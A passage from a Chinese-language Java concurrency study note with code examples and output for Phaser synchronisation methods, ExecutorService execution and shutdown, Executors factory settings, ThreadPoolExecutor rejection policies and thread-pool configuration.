}\n   \n       static void monitor(int index, Phaser phaser) {\n           String template = \"\\t【%s】【monitor-%d】【%30s】%s\\n\";\n           String actionName = Thread.currentThread().getName();\n           System.out.printf(template, actionName, index, \"phaser.getPhase\", phaser.getPhase());\n           System.out.printf(template, actionName, index, \"phaser.getRegisteredParties\", phaser.getRegisteredParties());\n           System.out.printf(template, actionName, index, \"phaser.getArrivedParties\", phaser.getArrivedParties());\n           System.out.printf(template, actionName, index, \"phaser.getUnarrivedParties\", phaser.getUnarrivedParties());\n           System.out.printf(template, actionName, index, \"phaser.isTerminated\", phaser.isTerminated());\n       }\n   }\n   ```\n\n   输出结果\n\n   ```java\n   【Thread-0】 arrived part one\n   【Thread-1】 arrived part one\n   【Thread-1】 passed part one\n   【Thread-0】 passed part one\n   \t【Thread-0】【monitor-1】【               phaser.getPhase】-2147483647\n   \t【Thread-1】【monitor-1】【               phaser.getPhase】-2147483647\n   \t【Thread-0】【monitor-1】【   phaser.getRegisteredParties】2\n   \t【Thread-1】【monitor-1】【   phaser.getRegisteredParties】2\n   \t【Thread-1】【monitor-1】【      phaser.getArrivedParties】2\n   \t【Thread-0】【monitor-1】【      phaser.getArrivedParties】2\n   \t【Thread-0】【monitor-1】【    phaser.getUnarrivedParties】0\n   \t【Thread-1】【monitor-1】【    phaser.getUnarrivedParties】0\n   \t【Thread-1】【monitor-1】【           phaser.isTerminated】true\n   \t【Thread-0】【monitor-1】【           phaser.isTerminated】true\n   【Thread-1】 arrived part two\n   \t【Thread-0】【monitor-2】【               phaser.getPhase】-2147483647\n   \t【Thread-0】【monitor-2】【   phaser.getRegisteredParties】2\n   \t【Thread-0】【monitor-2】【      phaser.getArrivedParties】2\n   \t【Thread-0】【monitor-2】【    phaser.getUnarrivedParties】0\n   \t【Thread-0】【monitor-2】【           phaser.isTerminated】true\n   \t【Thread-0】【monitor-3】【               phaser.getPhase】-2147483647\n   \t【Thread-0】【monitor-3】【   phaser.getRegisteredParties】2\n   \t【Thread-0】【monitor-3】【      phaser.getArrivedParties】2\n   \t【Thread-0】【monitor-3】【    phaser.getUnarrivedParties】0\n   \t【Thread-0】【monitor-3】【           phaser.isTerminated】true\n   【Thread-1】 passed part two\n   \t【Thread-1】【monitor-2】【               phaser.getPhase】-2147483647\n   \t【Thread-1】【monitor-2】【   phaser.getRegisteredParties】2\n   \t【Thread-1】【monitor-2】【      phaser.getArrivedParties】2\n   \t【Thread-1】【monitor-2】【    phaser.getUnarrivedParties】0\n   \t【Thread-1】【monitor-2】【           phaser.isTerminated】true\n   \t【Thread-1】【monitor-3】【               phaser.getPhase】-2147483647\n   \t【Thread-1】【monitor-3】【   phaser.getRegisteredParties】2\n   \t【Thread-1】【monitor-3】【      phaser.getArrivedParties】2\n   \t【Thread-1】【monitor-3】【    phaser.getUnarrivedParties】0\n   \t【Thread-1】【monitor-3】【           phaser.isTerminated】true\n   ```\n\n## 到达之后，不阻塞等待：arrive\n\n`public int arrive()`\n\n使用场景：仅==监控线程==关心任务完成，执行线程无需相互等待\n\n![arrive.drawio](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/arrive.drawio-1667231117133-89.png) \n\n```java\nimport practice.common.TaskFactory;\n\nimport java.util.concurrent.Phaser;\nimport java.util.stream.IntStream;\n\n/**\n * @author: DH\n * @date: 2022/6/28\n * @desc:\n */\npublic class PhaserExample6 {\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser(3);\n        IntStream.rangeClosed(1, 2).boxed().map(i -> phaser).forEach(ArriveTask::new);\n        // 此处main线程会阻塞，等待part one全部完成\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(\"【\" + Thread.currentThread().getName() + \"】 part one all done\");\n    }\n\n    static class ArriveTask extends Thread {\n        private final Phaser phaser;\n\n        public ArriveTask(Phaser phaser) {\n            this.phaser = phaser;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            TaskFactory.spendSecondsRandom(10, true, true);\n            monitor(1, phaser);\n            // parties 参与计数，但是不会阻塞等待\n            phaser.arrive();\n            System.out.println(\"【\" + Thread.currentThread().getName() + \"】 part one all done\");\n            TaskFactory.spendSecondsRandom(2, true, true);\n        }\n    }\n\n    static void monitor(int index, Phaser phaser) {\n        String template = \"\\t【%s】【monitor-%d】【%30s】%s\\n\";\n        String actionName = Thread.currentThread().getName();\n        System.out.printf(template, actionName, index, \"phaser.getPhase\", phaser.getPhase());\n        System.out.printf(template, actionName, index, \"phaser.getRegisteredParties\", phaser.getRegisteredParties());\n        System.out.printf(template, actionName, index, \"phaser.getArrivedParties\", phaser.getArrivedParties());\n        System.out.printf(template, actionName, index, \"phaser.getUnarrivedParties\", phaser.getUnarrivedParties());\n        System.out.printf(template, actionName, index, \"phaser.isTerminated\", phaser.isTerminated());\n    }\n}\n```\n\n输出结果\n\n```java\n\t【Thread-1】【monitor-1】【               phaser.getPhase】0\n\t【Thread-1】【monitor-1】【   phaser.getRegisteredParties】3\n\t【Thread-1】【monitor-1】【      phaser.getArrivedParties】1\n\t【Thread-1】【monitor-1】【    phaser.getUnarrivedParties】2\n\t【Thread-1】【monitor-1】【           phaser.isTerminated】false\n【Thread-1】 part one all done\n\t【Thread-0】【monitor-1】【               phaser.getPhase】0\n\t【Thread-0】【monitor-1】【   phaser.getRegisteredParties】3\n\t【Thread-0】【monitor-1】【      phaser.getArrivedParties】2\n\t【Thread-0】【monitor-1】【    phaser.getUnarrivedParties】1\n\t【Thread-0】【monitor-1】【           phaser.isTerminated】false\n【Thread-0】 part one all done\n【main】 part one all done\n\n```\n\n##  仅完成监控任务：awaitAdvance\n\nawaitAdvance方法 不占用 `party` 数量，在所有parties全部完成后执行\n\n```java\n/**\n * 仅完成监控任务：awaitAdvance\n */\npublic class PhaserExample7 {\n    public static void main(String[] args) {\n        // 若将phaser的parties注册为3，程序会加入阻塞状态\n        final Phaser phaser = new Phaser(2);\n        actionArriveAndAwaitAdvance(phaser).start();\n        actionArriveAndAwaitAdvance(phaser).start();\n\n        new Thread(() -> {\n            phaser.awaitAdvance(phaser.getPhase());\n            // 监听到指定phase的parties全部完成后执行\n            System.out.println(\"all parties finished：\" + phaser.getPhase());\n        }).start();\n\n        TaskFactory.spendSeconds(12);\n\n        actionArriveAndAwaitAdvance(phaser).start();\n        actionArriveAndAwaitAdvance(phaser).start();\n\n        new Thread(() -> {\n            phaser.awaitAdvance(phaser.getPhase());\n            // 监听到指定phase的parties全部完成后执行\n            System.out.println(\"all parties finished：\" + phaser.getPhase());\n        }).start();\n\n        TaskFactory.spendSeconds(12);\n        System.out.println(\"\\t【\" + Thread.currentThread().getName() + \"】\" + \" done\");\n    }\n\n    private static Thread actionArriveAndAwaitAdvance(Phaser phaser) {\n        return new Thread(() -> {\n            TaskFactory.spendSecondsRandom(5);\n            phaser.arriveAndAwaitAdvance();\n            TaskFactory.spendSeconds(1);\n            System.out.println(\"\\t【\" + Thread.currentThread().getName() + \"】\" + \" done\");\n        });\n    }\n}\n```\n\n输出结果\n\n```java\nall parties finished：1\n\t【Thread-0】 done\n\t【Thread-1】 done\nall parties finished：2\n\t【Thread-4】 done\n\t【Thread-3】 done\n```\n\n- 配合`arrive`使用\n\n```java\npackage practice.util.phaser;\n\nimport practice.common.TaskFactory;\n\nimport java.util.concurrent.Phaser;\nimport java.util.stream.IntStream;\n\n/**\n * 测试 利用 {@link java.util.concurrent.Phaser#awaitAdvance} 监控所有party完成指定任务，才允许后续操作\n */\npublic class PhaserExample8 {\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(3);\n        IntStream.rangeClosed(1, 2).boxed().map(i -> phaser).forEach(AwaitAdvanceTask::new);\n        phaser.awaitAdvance(phaser.getPhase());\n        System.out.println(\"【\" + Thread.currentThread().getName() + \"】 all part one finished.\");\n    }\n\n    static class AwaitAdvanceTask extends Thread {\n        private final Phaser phaser;\n\n        public AwaitAdvanceTask(Phaser phaser) {\n            this.phaser = phaser;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            // 需要监控完成的工作\n            actionDeal(\"part one\", 2);\n            phaser.arrive();\n            // 非阻塞等待，完成其他工作\n            actionDeal(\"part two\", 4);\n        }\n    }\n\n    static void actionDeal(String actionName, int seconds) {\n        System.out.println(\"【\" + Thread.currentThread().getName() + \"】 start \" + actionName + \".\");\n        TaskFactory.spendSeconds(seconds);\n        System.out.println(\"\\t【\" + Thread.currentThread().getName() + \"】 finish  \" + actionName + \".\");\n    }\n}\n```\n\n输出结果\n\n```java\n【Thread-1】 start part one.\n【Thread-0】 start part one.\n\t【Thread-1】 finish  part one.\n【Thread-1】 start part two.\n\t【Thread-0】 finish  part one.\n【Thread-0】 start part two.\n【main】 all part one finished.\n\t【Thread-0】 finish  part two.\n\t【Thread-1】 finish  part two.\n```\n\n## 打断/超时 终止：awaitAdvanceInterruptibly\n\n等待此Phaser的阶段从给定的phase值前进，如果在等待期间被中断，则抛出 InterruptedException，或者如果当前phase不等于给定的phase值或此Phaser终止，则立即返回。\n\n\n\n`Phaser.awaitAdvanceInterruptibly(int)` ，调用interrupt，抛出InterruptedException\n\n`Phaser.awaitAdvanceInterruptibly(int, long, TimeUnit)`: 调用interrupt/给定超时时间，抛出InterruptedException\n\n- 不占用 `party` 数量，在所有parties全部完成后执行\n\n- 打断了其中一个`party`，其他的 party 仍然能够继续执行\n\n  ```java\n  import practice.common.TaskFactory;\n  \n  import java.util.concurrent.Phaser;\n  import java.util.stream.IntStream;\n  \n  public class PhaserExample9 {\n      final static int finishTime = 2;\n      // phase未结束，可以被打断，其他的 party 仍然能够继续执行\n      final static int waitTimeBeforeInterrupt = 1;\n      // phase已结束，不会抛出打断异常\n      //final static int waitTimeBeforeInterrupt = 4;\n  \n      public static void main(String[] args) {\n          final Phaser phaser = new Phaser(2);\n          IntStream.rangeClosed(1, 2).forEach(i -> {\n              new Thread(() -> {\n                  TaskFactory.spendSeconds(finishTime);\n                  phaser.arriveAndAwaitAdvance();\n                  System.out.println(Thread.currentThread().getName() + \": continue.\");\n              }).start();\n          });\n  \n          Thread thread = new Thread(() -> {\n              try {\n                  // 允许被打断的await\n                  phaser.awaitAdvanceInterruptibly(phaser.getPhase());\n                  System.out.println(Thread.currentThread().getName() + \": continue.\");\n              } catch (InterruptedException e) {\n                  e.printStackTrace();\n                  System.out.println(Thread.currentThread().getName() + \": 未完成party数：\" + phaser.getUnarrivedParties());\n              }\n          });\n          thread.start();\n          TaskFactory.spendSeconds(waitTimeBeforeInterrupt);\n          thread.interrupt();\n          System.out.println(\"=================================\");\n      }\n  }\n  ```\n\n  输出结果\n\n  ```java\n  =================================\n  Thread-2: 未完成party数：2\n  java.lang.InterruptedException\n  \tat java.util.concurrent.Phaser.awaitAdvanceInterruptibly(Phaser.java:760)\n  \tat practice.util.phaser.PhaserExample9.lambda$main$2(PhaserExample9.java:28)\n  \tat java.lang.Thread.run(Thread.java:748)\n  Thread-1: continue.\n  Thread-0: continue.\n  ```\n\n## 强制销毁：forceTermination\n\n强制此Phaser进入终止状态。注册方的数量不受影响。如果此Phaser是分层Phaser集的成员，则该集中的所有Phaser都将终止。如果此Phaser已终止，则此方法无效。\n\n此方法可用于在一个或多个任务遇到意外异常后协调恢复。\n\n```java\nimport practice.common.TaskFactory;\n\nimport java.util.concurrent.Phaser;\nimport java.util.stream.IntStream;\n\npublic class PhaserExample10 {\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser(2);\n        IntStream.rangeClosed(1, 1).forEach(i -> {\n            new Thread(() -> {\n                TaskFactory.spendSeconds(5);\n                phaser.arriveAndAwaitAdvance();\n                monitor(1, phaser);\n                System.out.println(Thread.currentThread().getName() + \": continue.\");\n            }).start();\n        });\n        phaser.forceTermination();\n        monitor(1, phaser);\n        TaskFactory.spendSeconds(6);\n        System.out.println(\">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\");\n        IntStream.rangeClosed(1, 2).forEach(i -> {\n            new Thread(() -> {\n                TaskFactory.spendSeconds(5);\n                phaser.arriveAndAwaitAdvance();\n                monitor(1, phaser);\n                System.out.println(Thread.currentThread().getName() + \": continue.\");\n            }).start();\n        });\n        monitor(1, phaser);\n    }\n\n    static void monitor(int index, Phaser phaser) {\n        String template = \"\\t【%s】【monitor-%d】【%30s】%s\\n\";\n        String actionName = Thread.currentThread().getName();\n        System.out.printf(template, actionName, index, \"phaser.getPhase\", phaser.getPhase());\n        System.out.printf(template, actionName, index, \"phaser.getRegisteredParties\", phaser.getRegisteredParties());\n        System.out.printf(template, actionName, index, \"phaser.getArrivedParties\", phaser.getArrivedParties());\n        System.out.printf(template, actionName, index, \"phaser.getUnarrivedParties\", phaser.getUnarrivedParties());\n        System.out.printf(template, actionName, index, \"phaser.isTerminated\", phaser.isTerminated());\n    }\n}\n```\n\n输出结果\n\n```java\n\t【main】【monitor-1】【               phaser.getPhase】-2147483648\n\t【main】【monitor-1】【   phaser.getRegisteredParties】2\n\t【main】【monitor-1】【      phaser.getArrivedParties】0\n\t【main】【monitor-1】【    phaser.getUnarrivedParties】2\n\t【main】【monitor-1】【           phaser.isTerminated】true\n\t【Thread-0】【monitor-1】【               phaser.getPhase】-2147483648\n\t【Thread-0】【monitor-1】【   phaser.getRegisteredParties】2\n\t【Thread-0】【monitor-1】【      phaser.getArrivedParties】0\n\t【Thread-0】【monitor-1】【    phaser.getUnarrivedParties】2\n\t【Thread-0】【monitor-1】【           phaser.isTerminated】true\nThread-0: continue.\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n\t【main】【monitor-1】【               phaser.getPhase】-2147483648\n\t【main】【monitor-1】【   phaser.getRegisteredParties】2\n\t【main】【monitor-1】【      phaser.getArrivedParties】0\n\t【main】【monitor-1】【    phaser.getUnarrivedParties】2\n\t【main】【monitor-1】【           phaser.isTerminated】true\n\t【Thread-2】【monitor-1】【               phaser.getPhase】-2147483648\n\t【Thread-2】【monitor-1】【   phaser.getRegisteredParties】2\n\t【Thread-2】【monitor-1】【      phaser.getArrivedParties】0\n\t【Thread-2】【monitor-1】【    phaser.getUnarrivedParties】2\n\t【Thread-2】【monitor-1】【           phaser.isTerminated】true\nThread-2: continue.\n\t【Thread-1】【monitor-1】【               phaser.getPhase】-2147483648\n\t【Thread-1】【monitor-1】【   phaser.getRegisteredParties】2\n\t【Thread-1】【monitor-1】【      phaser.getArrivedParties】0\n\t【Thread-1】【monitor-1】【    phaser.getUnarrivedParties】2\n\t【Thread-1】【monitor-1】【           phaser.isTerminated】true\nThread-1: continue.\n\nProcess finished with exit code 0\n```\n\n\n\n[Toc]\n\n# Executor框架\n\n## ExecutorService接口\n\n### ExecutorService 继承树\n\n\n![Executor框架](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/Executor%E6%A1%86%E6%9E%B6-16588299109821-1667231117133-88.png)\n\n\n\n### ExecutorService的创建\n\n创建一个什么样的ExecutorService的实例（即线程池）需要g根据具体应用场景而定，不过Java给我们提供了一个Executors工厂类，它可以帮助我们很方便的创建各种类型ExecutorService线程池，Executors一共可以创建下面这四类线程池\n\n- ThreadPoolExecutor 核心构造函数\n\n```java\n  import java.util.concurrent.*;\nimport java.util.stream.IntStream;\n\n/**\n * 测试ThreadPoolExecutor\n */\npublic class ThreadPoolExecutorBuild {\n    public static void main(String[] args) {\n        ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) buildThreadPoolExecutor();\n\n        IntStream.rangeClosed(1, 50).forEach(index -> threadPoolExecutor.submit(() -> {\n            doAction(3);\n            monitorThreadPool(threadPoolExecutor, index);\n            System.out.println();\n            System.out.println();\n        }));\n\n        threadPoolExecutor.shutdown();\n    }\n\n    /** \n    * ThreadPoolExecutor 核心构造函数\n    */\n    private static ExecutorService buildThreadPoolExecutor() {\n        int corePoolSize = 2;\n        int maximumPoolSize = 10;\n        // 当线程数大于核心时，这是多余的空闲线程在终止前等待新任务的最长时间\n        long keepAliveTime = 1;\n        TimeUnit timeUnit = TimeUnit.SECONDS;\n        // 用于在任务完成之前保存任务的队列\n        BlockingQueue<Runnable> blockingQueue = new ArrayBlockingQueue<>(30);\n        // 线程创建工厂\n        ThreadFactory threadFactory = r -> new Thread(r);\n        // 拒绝策略\n        RejectedExecutionHandler rejectedExecutionHandler = new ThreadPoolExecutor.AbortPolicy();\n        return new ThreadPoolExecutor(corePoolSize, maximumPoolSize, keepAliveTime, timeUnit, blockingQueue,\n                threadFactory, rejectedExecutionHandler);\n    }\n\n    private static void monitorThreadPool(ThreadPoolExecutor threadPoolExecutor, int index) {\n        System.out.println(index + \"【getPoolSize】:\" + threadPoolExecutor.getPoolSize());\n        System.out.println(index + \"【getActiveCount】:\" + threadPoolExecutor.getActiveCount());\n        System.out.println(index + \"【getMaximumPoolSize】:\" + threadPoolExecutor.getMaximumPoolSize());\n        System.out.println(index + \"【getCompletedTaskCount】:\" + threadPoolExecutor.getCompletedTaskCount());\n        System.out.println(index + \"【getCorePoolSize】:\" + threadPoolExecutor.getCorePoolSize());\n        System.out.println(index + \"【getLargestPoolSize】:\" + threadPoolExecutor.getLargestPoolSize());\n    }\n\n    private static void doAction(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\nExecutors只是一个工厂类，它所有的方法返回的都是ThreadPoolExecutor、ScheduledThreadPoolExecutor这两个类的实例\n\n### ExecutorService的执行\n\nExecutorService有如下几个执行方法：\n\n```java\n- execute(Runnable)\n- submit(Runnable)\n- submit(Callable)\n- invokeAny(...)\n- invokeAll(...)\n```\n\n- execute(Runnable)\n\n这个方法接收一个Runnable实例，并且异步的执行，请看下面的实例：\n\n```java\nExecutorService executorService = Executors.newSingleThreadExecutor();\n\nexecutorService.execute(new Runnable() {\n  public void run() {\n     System.out.println(\"Asynchronous task\");\n  }\n});\n\nexecutorService.shutdown();\n```\n\n这个方法有个问题，就是没有办法获知task的执行结果。\n\n- submit(Runnable)\n\nsubmit(Runnable)和execute(Runnable) \n\n区别是前者可以返回一个Future对象，通过返回的Future对象，我们可以检查提交的任务是否执行完毕 \n\n```java\nFuture future = executorService.submit(new Runnable() {\n  public void run() {\n      System.out.println(\"Asynchronous task\");\n  }\n});\nfuture.get();  //returns null if the task has finished correctly.\n```\n\n如果任务执行完成，future.get()方法会返回一个null。注意，future.get()方法会产生阻塞。\n\n- submit(Callable)\n\nsubmit(Callable) 和submit(Runnable)类似，也会返回一个Future对象，但是除此之外，submit(Callable)接收的是一个Callable的实现，Callable接口中的call()方法有一个返回值，可以返回任务的执行结果，而Runnable接口中的run()方法是void的，没有返回值。\n\n\n```java\nFuture future = executorService.submit(new Callable(){\n\tpublic Object call() throws Exception {\n    \tSystem.out.println(\"Asynchronous Callable\");\n    \treturn \"Callable Result\";\n\t}\n});\n\nSystem.out.println(\"future.get() = \" + future.get());\n```\n\nfuture.get()方法会返回Callable任务的执行结果。注意，future.get()方法会产生阻塞。\n\n- invokeAny(…)\n\ninvokeAny(...)方法接收的是一个Callable的集合，执行这个方法不会返回Future，但是会返回所有Callable任务中其中一个任务的执行结果。这个方法也无法保证返回的是哪个任务的执行结果，反正是其中的某一个\n\n```java\nExecutorService executorService = Executors.newSingleThreadExecutor();\n\nSet<Callable<String>> callables = new HashSet<Callable<String>>();\n\ncallables.add(new Callable<String>() {\n\tpublic String call() throws Exception {\n \t   return \"Task 1\";\n\t}\n});\ncallables.add(new Callable<String>() {\n\tpublic String call() throws Exception {\n\t    return \"Task 2\";\n\t}\n});\ncallables.add(new Callable<String>() {\n    public String call() throws Exception {\n    return \"Task 3\";\n\t}\n});\n\nString result = executorService.invokeAny(callables);\nSystem.out.println(\"result = \" + result);\nexecutorService.shutdown();\n```\n\n每次执行都会返回一个结果，并且返回的结果是变化的，可能会返回“Task2”也可是“Task1”或者其它。\n\n- nvokeAll(…)\n\ninvokeAll(...)与 invokeAny(...)类似也是接收一个Callable集合，但是前者执行之后会返回一个Future的List，其中对应着每个Callable任务执行后的Future对象\n\n```java\nExecutorService executorService = Executors.newSingleThreadExecutor();\n\nList<Callable<String>> callables = new ArrayList<Callable<String>>();\n\ncallables.add(new Callable<String>() {\npublic String call() throws Exception {\n    return \"Task 1\";\n}\n});\ncallables.add(new Callable<String>() {\n    public String call() throws Exception {\n    return \"Task 2\";\n}\n});\ncallables.add(new Callable<String>() {\npublic String call() throws Exception {\n    return \"Task 3\";\n}\n});\n\nList<Future<String>> futures = executorService.invokeAll(callables);\n\nfor(Future<String> future : futures){\nSystem.out.println(\"future.get = \" + future.get());\n}\n\nexecutorService.shutdown();\n```\n\n`List<Callable<String>> callables` 返回的结果集是无序的。\n\n\n\n### ExecutorService的关闭\n\n当我们使用完成ExecutorService之后应该关闭它，否则它里面的线程会一直处于运行状态。\n\n- void shutdown()\n\n- List<Runnable> shutdownNow()\n\n![image-20220725112237287](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220725112237287-1667231117133-90.png) \n\n## Executors工具\n\n\n**利用：ThreadPoolExecutor(int corePoolSize, int maximumPoolSize,  long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue,  ThreadFactory threadFactory, RejectedExecutionHandler handler)**\n\n| Executors模板方法                                            | 特性                                                         | corePoolSize | maximumPoolSize   | keepAliveTime | unit                  | workQueue                                                    | threadFactory                    | handler                              |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------ | ----------------- | ------------- | --------------------- | ------------------------------------------------------------ | -------------------------------- | ------------------------------------ |\n| newFixedThreadPool(int  nThreads)                            | 线程池中的线程不会被销毁                                     | nThreads     | nThreads          | 0L            | TimeUnit.MILLISECONDS | <font color='red'> new LinkedBlockingQueue<Runnable>(Integer.MAX_VALUE)</font> | Executors.defaultThreadFactory() | defaultHandler（new  AbortPolicy()） |\n| newFixedThreadPool(int  nThreads, ThreadFactory threadFactory) | 线程池中的线程不会被销毁                                     | nThreads     | nThreads          | 0L            | TimeUnit.MILLISECONDS | new LinkedBlockingQueue<Runnable>(Integer.MAX_VALUE)         | Executors.defaultThreadFactory() | defaultHandler（new  AbortPolicy()） |\n| newSingleThreadExecutor                                      | 可以保留单线程需要执行的任务队列,并且将ThreadPoolExecutor中的方法屏蔽 | 1            | 1                 | 0L            | TimeUnit.MILLISECONDS | new LinkedBlockingQueue<Runnable>(Integer.MAX_VALUE)         | Executors.defaultThreadFactory() | defaultHandler（new  AbortPolicy()） |\n| newSingleThreadExecutor(ThreadFactory  threadFactory)        | 可以保留单线程需要执行的任务队列,并且将ThreadPoolExecutor中的方法屏蔽 | 1            | 1                 | 0L            | TimeUnit.MILLISECONDS | new LinkedBlockingQueue<Runnable>(Integer.MAX_VALUE)         | threadFactory                    | defaultHandler（new  AbortPolicy()） |\n| newCachedThreadPool()                                        | 每提交一个任务,创建一个线程                                  | 0            | Integer.MAX_VALUE | 60L           | TimeUnit.SECONDS      | <font color='red'>new SynchronousQueue<Runnable>()</font>    | Executors.defaultThreadFactory() | defaultHandler（new  AbortPolicy()） |\n| newCachedThreadPool(ThreadFactory  threadFactory)            | 每提交一个任务,创建一个线程                                  | 0            | Integer.MAX_VALUE | 60L           | TimeUnit.SECONDS      | new SynchronousQueue<Runnable>()                             | threadFactory                    | defaultHandler（new  AbortPolicy()） |\n| newSingleThreadScheduledExecutor()                           |                                                              | 0            | Integer.MAX_VALUE | 60L           | TimeUnit.SECONDS      | new DelayedWorkQueue()                                       | Executors.defaultThreadFactory() | defaultHandler（new  AbortPolicy()） |\n| newSingleThreadScheduledExecutor(ThreadFactory  threadFactory) |                                                              | 0            | Integer.MAX_VALUE | 60L           | TimeUnit.SECONDS      | <font color='red'>new DelayedWorkQueue()</font>              | threadFactory                    | defaultHandler（new  AbortPolicy()） |\n| newScheduledThreadPool(int  corePoolSize)                    |                                                              | corePoolSize | Integer.MAX_VALUE | 0             | TimeUnit.NANOSECONDS  | new DelayedWorkQueue()                                       | Executors.defaultThreadFactory() | defaultHandler（new  AbortPolicy()） |\n| newScheduledThreadPool(int  corePoolSize, ThreadFactory threadFactory) |                                                              | corePoolSize | Integer.MAX_VALUE | 0             | TimeUnit.NANOSECONDS  | new DelayedWorkQueue()                                       | threadFactory                    | defaultHandler（new  AbortPolicy()） |\n\n\n\n\n\n**利用ForkJoinPool(int parallelism,  ForkJoinWorkerThreadFactory factory,  UncaughtExceptionHandler handler,  boolean asyncMode)**\n\n| Executors模板方法                     | int parallelism                            | ForkJoinWorkerThreadFactory  factory            | UncaughtExceptionHandler handler | boolean asyncMode |\n| ------------------------------------- | ------------------------------------------ | ----------------------------------------------- | -------------------------------- | ----------------- |\n| newWorkStealingPool()                 | Runtime.getRuntime().availableProcessors() | ForkJoinPool.defaultForkJoinWorkerThreadFactory | null                             | TRUE              |\n| newWorkStealingPool(int  parallelism) | parallelism                                | ForkJoinPool.defaultForkJoinWorkerThreadFactory | null                             | TRUE              |\n\n```java\npackage hots.utils.executor;\n\nimport java.util.List;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\nimport java.util.stream.IntStream;\n\npublic class ExecutorsExample {\n    public static void main(String[] args) throws InterruptedException {\n        ExecutorService executorService = Executors.newWorkStealingPool();\n        List<Future<String>> futures = executorService.invokeAll(getTasks());\n        executorService.shutdown();\n    }\n\n    static List<Callable<String>> getTasks() {\n        return IntStream.rangeClosed(0, 20).boxed().map(i -> {\n            Callable<String> stringCallable = () -> {\n                System.out.println(Thread.currentThread().getName());\n                doAction(1);\n                return \"Task:\" + i;\n            };\n            return stringCallable;\n        }).collect(Collectors.toList());\n    }\n\n    private static void doAction(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\n\n\n## ThreadPoolExecutor\n\n### 四个内置拒绝策略\n\n- 继承自RejectedExecutionHandler\n\n![image-20220725171152798](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220725171152798-1667231117133-91.png) \n\n| 策略                | 说明                                                         |\n| ------------------- | ------------------------------------------------------------ |\n| AbortPolicy         | 抛出RejectedExecutionException异常                           |\n| DiscardPolicy       | 默默地丢弃被拒绝的任务                                       |\n| DiscardOldestPolicy | 丢弃最早的未处理请求，然后重试执行请求任务。若任务已被关闭，则丢弃任务 |\n| CallerRunsPolicy    | 直接在执行方法的调用线程中运行被拒绝的任务。若任务已被关闭，则丢弃任务 |\n\n\n\n### 自定义ThreadFactory\n\n```java\nimport lombok.Data;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.ThreadFactory;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n@Data\npublic class MyThreadFactory implements ThreadFactory {\n    private AtomicInteger SEQ = new AtomicInteger();\n    private List<FailedAction> failed = new ArrayList<>();\n\n    @Override\n    public Thread newThread(Runnable r) {\n        Thread thread = new Thread(r);\n        thread.setName(\"Factory-\" + SEQ.getAndIncrement());\n        thread.setUncaughtExceptionHandler((t, e) -> {\n            // 保留异常信息\n            failed.add(new FailedAction(t, e));\n        });\n        return thread;\n    }\n\n    @Data\n    static class FailedAction {\n        private Thread thread;\n        private Throwable throwable;\n\n        FailedAction(Thread t, Throwable e) {\n            this.thread = t;\n            this.throwable = e;\n        }\n    }\n}\n```\n\n```java\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class MyThreadFactoryTest {\n    public static void main(String[] args) {\n        MyThreadFactory myThreadFactory = new MyThreadFactory();\n        ExecutorService executorService = Executors.newFixedThreadPool(1, myThreadFactory);\n        executorService.execute(() -> System.out.println(1 / 0));\n        myThreadFactory.getFailed().stream().map(e -> e.getThrowable()).forEach(e -> e.printStackTrace());\n        executorService.shutdown();\n    }\n}\n```\n\n\n\n### 允许回收执行线程：allowCoreThreadTimeOut\n\n```java\nprivate volatile boolean allowCoreThreadTimeOut;\n```\n\n```java\npublic class AllowCoreThreadTimeOutTest {\n    public static void main(String[] args) {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor) Executors.newFixedThreadPool(2);\n        executorService.setKeepAliveTime(10, TimeUnit.SECONDS);\n        executorService.submit(() -> System.out.println(Thread.currentThread().getName()));\n        executorService.allowCoreThreadTimeOut(true);\n    }\n}\n\n# 10秒后线程池被销毁，测试进程退出\n```\n\n```java\npublic class AllowCoreThreadTimeOutTest {\n    public static void main(String[] args) {\n        ThreadPoolExecutor executorService = (ThreadPoolExecutor) Executors.newFixedThreadPool(2);\n        executorService.setKeepAliveTime(10, TimeUnit.SECONDS);\n        executorService.submit(() -> System.out.println(Thread.currentThread().getName()));\n        executorService.allowCoreThreadTimeOut(false);\n    }\n}\n\n# 测试进程无法退出，executorService保有2个活跃的执行线程\n```\n\n### 删除任务：remove\n\n适用于`executorService.execute(e) `提交的任务，而`executorService.submit(e)` 提交的任务，无法移除。submit 提交的任务\n\n```java\npublic class RemoveTest {\n    public static void main(String[] args) {\n        ThreadPoolExecutor executorService = new ThreadPoolExecutor(2, 2, 0, TimeUnit.SECONDS,\n                new ArrayBlockingQueue<>(2));\n\n        List<Runnable> runnableList = IntStream.rangeClosed(0, 3).boxed().map(i -> (Runnable) () -> {\n                    sleep(5);\n                    System.out.println(\"task:\" + i + \" with \" + Thread.currentThread().getName());\n                }\n        ).collect(Collectors.toList());\n        runnableList.stream().forEach(e -> executorService.execute(e));\n\n        sleep(1);\n        boolean result = executorService.remove(runnableList.get(2));\n        System.out.println(\"remove result : \" + result);\n\n        sleep(6);\n        